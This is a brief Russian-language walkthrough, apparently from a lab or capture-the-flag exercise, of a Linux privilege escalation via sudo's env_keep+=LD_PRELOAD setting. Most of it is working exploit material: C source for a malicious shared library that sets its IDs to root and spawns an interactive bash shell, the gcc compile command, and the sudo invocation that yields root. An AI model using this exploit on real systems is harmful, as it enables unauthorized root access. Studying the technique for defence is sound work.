## LD_PRELOAD через sudo

Заходим на сервер, сразу пытаемся посмотреть sudo -l, видим env_keep+=LD_PRELOAD и (ALL : ALL) NOPASSWD: /opt/process_logs.sh, значит пользователь может сначала скомпилить библиотеку под с чтобы она потом загружалась при LD_PRELOAD, а запуск с sudo без пароля скрипта process_logs.sh позволит библиотеке подгрузиться с повышенными привилегиями

Сначала пишем сишную библиотеку:
```c
cat > program2.c <<'EOF'  
#include <stdio.h>  
#include <unistd.h>  
#include <stdlib.h>  
  
__attribute__((constructor))  
static void init_hook(void) {  
   if (geteuid() != 0) return;    
   unsetenv("LD_PRELOAD");    
   setuid(0);  
   setgid(0);  
   system("/bin/bash -i");  
}  
EOF
```

потом компилим её:
`gcc -fPIC -shared program2.c -o program2.so`

и передаём её в LD_PRELOAD при запуске скрипта от рута:
`sudo LD_PRELOAD=./program2.so /opt/process_logs.sh`

Всё, мы под рутом
